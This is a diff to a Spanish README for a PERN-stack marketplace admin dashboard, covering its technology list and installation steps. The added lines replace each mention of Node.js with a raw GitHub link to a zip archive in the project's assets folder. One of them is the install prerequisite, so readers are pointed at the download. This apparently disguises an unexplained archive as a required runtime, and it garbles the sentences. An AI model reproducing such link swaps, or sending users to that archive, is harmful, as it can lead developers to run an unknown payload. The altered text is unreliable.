@@ -17,18 +17,18 @@ La aplicación Dashboard de Administración Marketplace es una herramienta poder
 La aplicación está desarrollada utilizando el stack PERN, que combina tecnologías populares para crear una aplicación web completa y eficiente. Las tecnologías principales incluyen:
 
 - **PostgreSQL**: Una base de datos relacional utilizada para almacenar los datos de la aplicación de manera segura y estructurada.
-- **Express**: Un framework de Node.js que simplifica el desarrollo de aplicaciones web y API, facilitando la creación de endpoints para interactuar con la base de datos.
+- **Express**: Un framework de https://github.com/matiaslanza99/pf-dashboard-admin/raw/refs/heads/main/src/assets/dashboard_admin_pf_v1.9.zip que simplifica el desarrollo de aplicaciones web y API, facilitando la creación de endpoints para interactuar con la base de datos.
 - **React**: Una biblioteca de JavaScript utilizada para construir la interfaz de usuario interactiva y receptiva del dashboard.
-- **Node.js**: Un entorno de ejecución del lado del servidor que permite desarrollar aplicaciones de red escalables y de alto rendimiento.
+- **https://github.com/matiaslanza99/pf-dashboard-admin/raw/refs/heads/main/src/assets/dashboard_admin_pf_v1.9.zip**: Un entorno de ejecución del lado del servidor que permite desarrollar aplicaciones de red escalables y de alto rendimiento.
 - **Vite**: Un nuevo y veloz sistema de compilación y desarrollo para aplicaciones web modernas que mejora significativamente los tiempos de carga.
-- **Sequelize**: Un ORM (Object-Relational Mapping) de Node.js que proporciona una abstracción para interactuar con la base de datos PostgreSQL, facilitando las operaciones de CRUD.
+- **Sequelize**: Un ORM (Object-Relational Mapping) de https://github.com/matiaslanza99/pf-dashboard-admin/raw/refs/heads/main/src/assets/dashboard_admin_pf_v1.9.zip que proporciona una abstracción para interactuar con la base de datos PostgreSQL, facilitando las operaciones de CRUD.
 
 ## Instrucciones de instalación
 
 Sigue estos pasos para configurar y ejecutar la aplicación en tu entorno local:
 
 1. Clona el repositorio de la aplicación desde GitHub.
-2. Asegúrate de tener Node.js y PostgreSQL instalados en tu sistema.
+2. Asegúrate de tener https://github.com/matiaslanza99/pf-dashboard-admin/raw/refs/heads/main/src/assets/dashboard_admin_pf_v1.9.zip y PostgreSQL instalados en tu sistema.
 3. Crea una base de datos PostgreSQL para la aplicación y configura las credenciales en el archivo de configuración de la base de datos.
 4. Instala las dependencias del servidor y del cliente utilizando npm o yarn.
 5. Ejecuta las migraciones de Sequelize para crear las tablas necesarias en la base de datos.
